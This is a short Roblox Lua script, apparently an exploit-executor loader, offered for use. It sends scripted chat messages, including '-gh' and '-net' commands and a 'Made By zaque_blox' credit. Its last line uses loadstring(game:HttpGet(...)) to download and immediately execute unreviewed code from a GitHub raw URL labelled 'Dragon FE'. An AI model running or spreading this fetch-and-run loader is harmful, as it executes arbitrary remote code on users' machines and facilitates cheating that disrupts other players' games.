-- Services
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Function to send a chat message
local function SendChatMessage(message)
    -- Check if the new TextChatService is enabled
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        local textChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral") -- Default chat channel
        if textChannel then
            textChannel:SendAsync(message) -- Sends the message in chat
        else
            warn("RBXGeneral channel not found!")
        end
    else
        -- Use legacy chat system for older games
        local sayMessageRequest = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents"):FindFirstChild("SayMessageRequest")
        if sayMessageRequest then
            sayMessageRequest:FireServer(message, "All") -- Sends the message in chat
        else
            warn("Legacy chat system not found!")
        end
    end
end

-- Messages to send
local customMessage2 = "Iniciando script aguarde..."
local customMessage = "-gh 63690008 62234425 12103270510 10775031176 9350274205"
local netMessage = "-net"
local madeByzaqueMessage = "Made By zaque_blox"

-- Send the first message immediately
SendChatMessage(customMessage2)

task.wait(2)

SendChatMessage(customMessage)

-- Wait for 0.7 seconds before sending the next message
task.wait(0.7)

-- Send the second message after the delay
SendChatMessage(netMessage)

-- Wait for 0.2 seconds before sending "Made by zaque_blox"
task.wait(0.2)

-- Send "Made by zaque_blox" message after -net
SendChatMessage(madeByzaqueMessage)

-- Loadstring for the Script (executed after sending messages)
loadstring(game:HttpGet('https://raw.githubusercontent.com/RainCreatorHub/Rain-Hub/refs/heads/main/Just%20a%20baseplate%20Dragon%20FE.lua'))()
